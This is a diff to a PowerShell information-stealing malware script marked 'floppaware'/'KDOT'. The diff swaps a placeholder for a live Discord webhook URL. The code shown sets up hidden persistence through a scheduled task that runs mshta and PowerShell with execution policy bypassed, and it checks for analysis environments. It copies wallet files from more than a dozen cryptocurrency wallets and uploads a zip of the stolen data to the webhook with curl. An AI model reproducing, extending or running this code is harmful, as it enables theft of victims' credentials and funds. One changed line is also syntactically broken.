@@ -1,8 +1,9 @@
 #floppaware
+$start_time = Get-Date
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
-$webhook = "YOUR_WEBHOOK_HERE"
-$debug_mode = $false
+$webhook = "https://discord.com/api/webhooks/1129247360376111205/pYGdoS7dJsXf8wf9d1BYN2lmyawBaFu3D13QAPL9w709_DlSIjIljh-mo1HJmg3AMz10"
+$debug_mode = $true
 
 if (!($debug_mode)) {
     $ErrorActionPreference = "SilentlyContinue"
@@ -48,7 +49,7 @@ function Invoke-ANTITOTAL {
         $result = Invoke-WebRequest -Uri $url -UseBasicParsing
         if ($result.StatusCode -eq 200) {
             $content = $result.Content
-            $function = Get-Command -Name $functionName1
+            $function = Get-Command -Name $functions[$i]
             $output = & $function.Name $content
             
             if ($output -eq $true) {
@@ -154,6 +155,7 @@ function Invoke-TASKS {
     # Hidden Directory
     $KDOT_DIR = get-item "$env:APPDATA\KDOT" -Force
     $KDOT_DIR.attributes = "Hidden", "System"
+    Remove-Item -Path "$env:APPDATA\KDOT\KDOT.ps1" -Force -ErrorAction SilentlyContinue
     Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     $task_name = "KDOT"
     $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
@@ -377,10 +379,10 @@ function Export-Data {
     Move-Item "$main_temp\tokens.txt" $folder_general -Force
 
     #remove empty dirs
-    #do {
-    #    $dirs = gci $folder_general -directory -recurse | Where { (gci $_.fullName).count -eq 0 } | select -expandproperty FullName
-    #    $dirs | Foreach-Object { Remove-Item $_ }
-    #} while ($dirs.count -gt 0)
+    do {
+        $dirs = Get-ChildItem $folder_general -directory -recurse | Where-Object { (Get-ChildItem $_.fullName).count -eq 0 } | Select-Object -expandproperty FullName
+        $dirs | Foreach-Object { Remove-Item $_ }
+    } while ($dirs.count -gt 0)
 
     Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook
@@ -842,61 +844,61 @@ function Invoke-surfsharkvpnstealer {
 
 function Invoke-Crypto_Wallets {
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
-        New-Item -Path "$crypto\Armory" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Armory" -ItemType Directory -Force - | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$crypto\Armory" -Recurse -Force
     }
     
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
-        New-Item -Path "$crypto\Atomic" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Atomic" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$crypto\Atomic" -Recurse -Force
     }
     
     If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
-        New-Item -Path "$crypto\BitcoinCore" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\BitcoinCore" -ItemType Directory -Force | Out-Null
         Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\BitcoinCore" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
-        New-Item -Path "$crypto\bytecoin" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\bytecoin" -ItemType Directory -Force | Out-Null
         Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$crypto\bytecoin" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
-        New-Item -Path "$crypto\Coinomi" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Coinomi" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$crypto\Coinomi" -Recurse -Force
     }
     If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
-        New-Item -Path "$crypto\DashCore" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\DashCore" -ItemType Directory -Force | Out-Null
         Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\DashCore" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
-        New-Item -Path "$crypto\Electrum" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Electrum" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$crypto\Electrum" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
-        New-Item -Path "$crypto\Ethereum" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Ethereum" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$crypto\Ethereum" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
-        New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\exodus.wallet" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
-        New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Guarda" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
-        New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$crypto\liberty.jaxx" -Recurse -Force
     }
     If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
-        New-Item -Path "$crypto\Litecoin" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Litecoin" -ItemType Directory -Force | Out-Null
         Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\Litecoin" -Recurse -Force
     }
     If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
-        New-Item -Path "$crypto\Monero" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Monero" -ItemType Directory -Force | Out-Null
         Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$crypto\Monero" -Recurse  -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
-        New-Item -Path "$crypto\Zcash" -ItemType Directory | Out-Null
+        New-Item -Path "$crypto\Zcash" -ItemType Directory -Force | Out-Null
         Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
     }
 }
@@ -959,5 +961,8 @@ if (Invoke-Admin_Check -eq $true) {
 }
 
 if ($debug_mode) {
+    $end_time = Get-Date
+    $end_out = $end_time - $start_time
+    Write-Host "End time: $end_out"
     Start-Sleep -s 10000
 }
